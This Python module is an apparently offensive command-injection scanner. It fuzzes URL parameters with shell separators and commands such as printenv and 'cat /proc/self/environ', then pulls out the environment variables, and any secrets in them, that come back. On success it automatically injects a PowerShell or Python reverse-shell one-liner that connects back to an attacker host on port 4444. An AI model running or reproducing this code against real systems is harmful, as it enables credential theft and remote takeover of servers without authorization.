import time
import aiohttp
import asyncio
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Payloads ที่เน้นดูดข้อมูล Environment Variables
# printenv (Linux), set (Windows)
ENV_PAYLOADS = [
    ("printenv", "PATH="),       # Linux
    ("set", "dows\\system32"),   # Windows (Windows folder path)
    ("env", "PWD="),             # Linux Alternate
    ("cat /proc/self/environ", "HTTP_USER_AGENT") # LFI-style RCE
]

SEPARATORS = [";", "|", "||", "&", "&&", "\n", "`", "$()"]

async def check_rce_dump(session, url):
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        return findings

    # Loop Fuzzing Parameters
    for param_name in params:
        for cmd, signature in ENV_PAYLOADS:
            for sep in SEPARATORS:
                # สร้าง Payload: original_value; printenv
                # หรือ ; printenv
                payloads_to_try = [
                    f"{sep} {cmd}",
                    f"{sep} {cmd} #",
                    f"a {sep} {cmd}"
                ]
                
                for injection in payloads_to_try:
                    fuzzed_params = params.copy()
                    # ลองต่อท้ายค่าเดิม
                    fuzzed_params[param_name] = [fuzzed_params[param_name][0] + injection]
                    
                    target_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params, doseq=True)))
                    
                    try:
                        async with session.get(target_url, timeout=10, ssl=False) as resp:
                            text = await resp.text()
                            
                            if signature in text:
                                # [NO MERCY] Capture Environment Variables
                                # ดึงข้อมูลที่ดูเหมือน Env Vars ออกมาโชว์ (KEY=VALUE)
                                env_vars = re.findall(r'([A-Z_]+=[^\n<]+)', text)
                                evidence = "\n".join(env_vars[:20]) # เอามาสัก 20 ตัวแรก
                                if not evidence: evidence = text[:500] # ถ้า regex ไม่ติด เอา raw text มาเลย

                                findings.append({
                                    "type": "RCE (Environment Variable Dump)",
                                    "severity": "Critical",
                                    "detail": f"Successfully executed command '{cmd}' via '{param_name}'. Extracted System Environment Variables.",
                                    "evidence": f"Payload: {injection}\n\n[IMPACT PROOF - SYSTEM ENV]\n{evidence}\n...(truncated)",
                                    "remediation": "Sanitize input, use parameterized commands, or disable shell execution."
                                })
                                
                                # [KINETIC STRIKE] AUTO-ESCALATE TO C2 SESSION
                                try:
                                    from core.c2_manager import c2_manager
                                    lhost = c2_manager.get_lhost_address(url)
                                    lport = "4444" 
                                    
                                    if log_callback:
                                        log_callback(f"   ☠️ RCE Verified! Escaling to C2 Session ({lhost}:{lport})...")
                                    
                                    # Deterministic OS Guess based on payload success
                                    # printenv -> Linux, set -> Windows
                                    is_win = "set" in cmd.lower()
                                    
                                    c2_cmd = ""
                                    if is_win:
                                        # PowerShell One-Liner
                                        ps_payload = f"$client = New-Object System.Net.Sockets.TcpClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
                                        c2_cmd = f"powershell -nop -c \"{ps_payload}\""
                                    else:
                                        # Linux Python/Bash
                                        c2_cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

                                    # Inject C2 Payload
                                    c2_params = params.copy()
                                    # Same separator, new command
                                    c2_injection = f"{sep} {c2_cmd}" 
                                    c2_params[param_name] = [c2_params[param_name][0] + c2_injection]
                                    
                                    c2_url = urlunparse(parsed._replace(query=urlencode(c2_params, doseq=True)))
                                    
                                    # We use await session.get (synchronous) because we fixed the session error
                                    await session.get(c2_url, timeout=1, ssl=False)
                                    if log_callback: log_callback("   🚀 C2 Payload Sent!")
                                    
                                except Exception as e:
                                    if log_callback: log_callback(f"   ⚠️ C2 Escalation Failed: {e}")

                                return findings # เจอแล้วหยุดเลย ถือว่า Critical สูงสุด
                    except Exception:
                        pass
    return findings

async def run_os_command_scan(target_url, log_callback=None, headers=None):
    findings = []
    if "?" in target_url:
        if log_callback: log_callback(f"💻 Attempting RCE to dump System Environment Variables (No Mercy)...")
        async with aiohttp.ClientSession(headers=headers) as session:
            findings = await check_rce_dump(session, target_url)
            
    return findings